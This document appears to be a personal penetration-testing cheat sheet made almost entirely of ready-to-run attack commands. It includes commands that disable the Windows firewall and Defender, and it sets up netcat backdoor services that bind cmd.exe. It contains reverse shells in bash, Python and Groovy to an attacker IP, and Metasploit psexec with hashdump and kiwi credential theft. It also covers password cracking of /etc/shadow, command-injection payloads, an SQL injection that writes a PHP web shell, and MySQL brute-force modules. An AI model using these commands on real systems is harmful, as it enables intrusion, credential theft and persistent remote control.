systemctl start postgresql

disable firewall

	netsh advfirewall show allprofiles

	netsh advfirewall set allprofile state off

 

disable windows defender

	control /name Microsoft.WindowsDefender

 

change ip address

	/etc/network/interface

 

enum users

	nmap -n --script=smb-enum-users.nse -p 139 192.168.0.1

 

netcat scan

	nc -v -n -z -w1 192.168.0.1 20-80

	echo "" | nc -v -n -w1 192.168.0.1 20-80

 

netcat bridgeports

	mknod /tmp/file p

	nc -l -p 4444 0</tmp/file | nc localhost 22 1>/tmp/file

		ssh server 4444 <use port 4444

 

Web server

	python -m SimpleHTTPServer 8000

 

windows prompt

	runas /u:fred cmd.exe

	net user fred /add

	net user fred *

	net localgroup administrators fred /add

	net localgroup administrators fred /del

 

windows resolve range of IPs

	for /L %i in (1,1,255) do @nslookup 10.10.10.%1 10.10.10.60 2>nul | find "Name" && echo 10.10.10.%i

 

add netcat service

	sc \\victim create myservice binpath="c:\nc.exe -l -p 2222 -e cmd.exe"
	sc \\victim query myservice
	sc \\victim start myservice
	sc \\victim delete myservice

	wmic process call create "c:\nc.exe -d -l -p 4444 -e cmd.exe" /node:victim /user:[admin] /password:[password]
	wmic process where name="nc.exe" delete

	New-Service -name myservice -BinaryPathName "cmd.exe /k c:\nc.exe -l -p 3333 -e cmd.exe" -StartupType manual
	Start-Service myservice
	sc.exe delete myservice

powershell

	ls -r c:\users *password*.txt | % {echo $_.fullname}
	ls -r c:\users *pass* | % {echo $_.fullname;gc $_.fullname}

	wget "url" -outfile c:\f.txt; gc c:\f.txt; del c:\f.txt


REVERSE SHELL
	bash -i >& /dev/tcp/ATTACKING-IP/80 0>&1
	
	rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
	
	r = Runtime.getRuntime()
	p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
	p.waitFor()
	
	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
	
	KALI
		/usr/share/webshells/*
		
REVERSE SHELL HANDLER
	msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.254.132 LPORT=4444 -f war > shell.war

	use exploit/multi/handler
	set PAYLOAD java/jsp_shell_reverse_tcp
	set LHOST 192.168.10.1
	run
		

passwords

	cp /user/share/john[tab][tab]/run/password.lst /tmp/



	pw-inspector

					cat /tmp/password.lst | pw-inspector -m 6 -n -u -l -c 2

					

	use exploit/windows/smb/psexec

	set payload windows/meterpreter/reverse_tcp

	set rhost victim

	set lhost mylocal

	set SMBUSer username

	set SMBPass password

	run

	getprivs

	run hashdump



	load kiwi

	creds_all



	cp -r /opt/john[tab][tab] /tmp/john

	cd /tmp/john

	make clean linux-x86-sse2

	cp sam.txt /tmp

	cd run

	./john /tmp/sam.txt



	cp /etc/passwd /tmp/john/run/passwd_copy

	cp /etc/shadow /tmp/john/run/shadow_copy

	./unshadow password_copy shadow_copy > combined.txt

	./john combined.txt

	cat john.pot

 

nikto

	nikto -h 192.168.254.133

 

blind command injection

	tcpdump -n host local and icmp

	>> test; pinc -c 4 local; echo hello



	test; nc -n -v- -l -l 2222 -e /bin/bash; echo hello



	nc -n -v -l -p 2222

	test; /bin/bash -i > /dev/tcp/[local]/2222 0<&1 2>&1; echo hello

 

SQL injection

	" union select "<?php if (isset($_REQUEST['cmd'])){echo '<pre>; system($_REQUEST['cmd']); echo '</pre>'; } ?><form action=<?php echo basename($_SERVER['PHP_SELF'])?>> <input type=text name=cmd size=20> <input type=submit></form>","", "","","","" into outfile "/var/www/html/filename.php" #


	sqlmap -u <utL> --data="id=1&submit=submit" --cookie="<cookie value>" --dbs	
	sqlmap -u <utL> --data="id=1&submit=submit" --cookie="<cookie value>" --msf-path=/usr/share/metasploit-framework/ --os-pwn --tmp-path="C:\temp"	

nmap -sS -A -sV -p3306 192.168.0.0


MySQL 	5.1.x before 5.1.63, 
		5.5.x before 5.5.24, 
		5.6.x before 5.6.6
MariaDB 	5.1.x before 5.1.62, 
			5.2.x before 5.2.12, 
			5.3.x before 5.3.6,
			5.5.x before 5.5.23, 

	for i in `seq 1 1000`; do
	mysql -u root --password=bad -h 192.168.0.0
	done

MySQL versions before or equal to 5.1.61 (on some platforms)
MySQL versions before or equal to 5.5.24 (on some platforms)

	use auxiliary/scanner/mysql/mysql_authbypass_hashdump
	set RHOSTS 192.168.178.43
	set USERNAME root
	run

MYSQL brute force
	use auxiliary/scanner/mysql/mysql_login
	/usr/share/wordlists
	set THREADS 1000
	set RHOSTS 192.168.179.142
	set PASS_FILE /usr/share/wordlists/rockyou.txt
	set USERNAME root
	set STOP_ON_SUCCESS true
	set VERBOSE false
	set BLANK_PASSWORDS true
	run

MYSQL read file
	use auxiliary/admin/mysql/mysql_sql
	set USERNAME root
	set PASSWORD ”
	set RHOST 192.168.179.142
	set RPORT 3306
	set SQL select load_file(\’/etc/passwd\’)


MYSQL writable dirs
	use auxiliary/scanner/mysql/mysql_writable_dirs
	set rhosts 192.168.1.108
	set username root
	set password 123
	set dir_list /root/dir.txt
	exploit

MYSQL enumerate files
	use auxiliary/scanner/mysql/mysql_file_enum
	set rhosts 192.168.1.108
	set username root
	set password 123
	set file_list /root/dir.txt
	exploit

https://hack2rule.wordpress.com/2017/02/25/sql-injection-to-meterpreter/
https://www.hackingarticles.in/penetration-testing-on-mysql-port-3306/
https://www.yeahhub.com/mysql-pentesting-metasploit-framework/

               
POP3

	nmap -sV --script=pop3-brute <target>

 
DOWNLOAD
	bitsadmin /transfer myDownloadJob /download /priority normal URL FULLPATH
	certutil.exe -urlcache -split -f "URL" FILENAME

NETCAT
	nc -nvlp PORT
	nc -e  /bin/sh LOCAL PORT

SHELL
	Meterpreter> run post/windows/gather/hashdump

	reg save hklm\sam sam
	reg save hklm\system system
	$ samdump2 system sam


SAMBA execute
use exploit/windows/smb/psexec
set payload windows/meterpreter/reverse_tcp
set SHARE C$
set SMBUSER vagrant
set SMBPASS aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b

METASPLOIT modules

	RUBY on Rails
		use auxiliary/scanner/http/rails_xml_yaml_scanner
		set RHOSTS 192.168.0.0/24
		set RPORT 80
		set THREADS 128
		run
		
		use exploit/multi/http/rails_xml_yaml_code_exec
		set RHOST 192.168.0.4
		set RPORT 80
		run

	pfSense  version <= 2.3.1_1
		use exploit/unix/http/pfsense_group_member_exec
		
	pfSense   version <= 2.2.6 
		use exploit/unix/http/pfsense_graph_injection_exec
		
	SAMBA
		use auxiliary/scanner/smb/smb_version
		use exploit/multi/samba/usermap_script
		
	VSFTPD
		use exploit/unix/ftp/vsftpd_234_backdoor
		
	VNC
		use auxiliary/scanner/vnc/vnc_none_auth
		set RHOSTS 192.168.1.0/24
		
		
SSH
	mkdir /etc/ssh/default_keys
	mv /etc/ssh/ssh_host_* /etc/ssh/default_keys/
	dpkg-reconfigure openssh-server
	systemctl start ssh.socket
	useradd cdx
	passwd cdx
	ssh -L 1234:localhost:5432 cdx@192.168.254.132
	cat /usr/share/metasploit-framework/config/database.yml
	db_connect msf:password@127.0.0.1:1234/msf
	
.
